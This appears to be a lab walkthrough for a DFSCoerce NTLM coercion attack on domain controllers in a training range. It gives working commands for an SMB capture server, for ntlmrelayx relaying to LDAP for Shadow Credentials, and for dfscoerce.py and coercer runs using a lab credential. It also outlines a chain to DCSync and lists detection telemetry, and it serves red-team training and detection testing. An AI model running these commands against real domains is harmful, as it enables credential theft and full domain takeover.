# WT#019 — DFSCoerce

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.10 (dc01.cadre.local) and 192.168.77.11 (dc02.child.cadre.local) |
| **Domain** | cadre.local |
| **Starting Credential** | analyst_dfir / An@lyst_DF1R! |
| **Tools Required** | dfscoerce.py, coercer, impacket-ntlmrelayx |
| **Certifications** | CAPE |
| **MITRE ATT&CK** | T1187 |
| **Difficulty** | Easy |

## Prerequisites
- Valid domain credentials for any domain user
- DFS Namespace (MS-DFSNM) role installed on target DC (configured in CADRE vulns role)
- Network connectivity from Kali (192.168.77.41) to target DC
- Attacker-controlled SMB listener on Kali

## Attack Steps

### Step 1: Start NTLM capture or relay listener
```bash
# Capture-only:
sudo impacket-smbserver -smb2support share /dev/null

# Or relay to LDAP for Shadow Credentials (see WT#021):
impacket-ntlmrelayx -t ldap://dc01.cadre.local --shadow-credentials --escalate-user ops_redcell
```

### Step 2: Run DFSCoerce against target DC
```bash
# Target dc01 (cadre.local):
python3 dfscoerce.py -d cadre.local -u analyst_dfir -p An@lyst_DF1R! 192.168.77.41 dc01.cadre.local

# Target dc02 (child.cadre.local):
python3 dfscoerce.py -d cadre.local -u analyst_dfir -p An@lyst_DF1R! 192.168.77.41 dc02.child.cadre.local
```

### Step 3: Alternative — using coercer
```bash
coercer coerce -l 192.168.77.41 -t 192.168.77.10 -d cadre.local -u analyst_dfir -p An@lyst_DF1R! --dfscoerce
```

### Step 4: Verify captured NTLM authentication
Check terminal output for `dc01$@CADRE.LOCAL` or `dc02$@CHILD.CADRE.LOCAL` NetNTLM hash.

## Post-Exploitation Chain
- Coerced DC machine account hash → relay to LDAP (WT#021) → Shadow Credentials → DCSync
- Hash can be cracked offline if relay fails

## Telemetry Verification
| Source | What to look for |
|--------|-----------------|
| **Windows Security (target DC)** | Event 4662 (DFS RPC access), Event 5156 (outbound SMB to Kali) |
| **Sysmon (target DC)** | Event 3 (DFS RPC connection to Kali:445) |
| **Zeek (monitor)** | `dce_rpc.log` showing DFS-NM RPC interface calls |
| **Suricata (monitor)** | DFSNM named pipe / RPC alerts |
| **Arkime (monitor)** | Full PCAP of DFS-RPC coercion traffic |
| **Elastic / Kibana** | `logs-system.security-*`, `logs-windows.sysmon_operational-*` |

## Status
**CONFIGURED** — DFS Namespace role installed on both DCs. dfscoerce.py available on Kali.
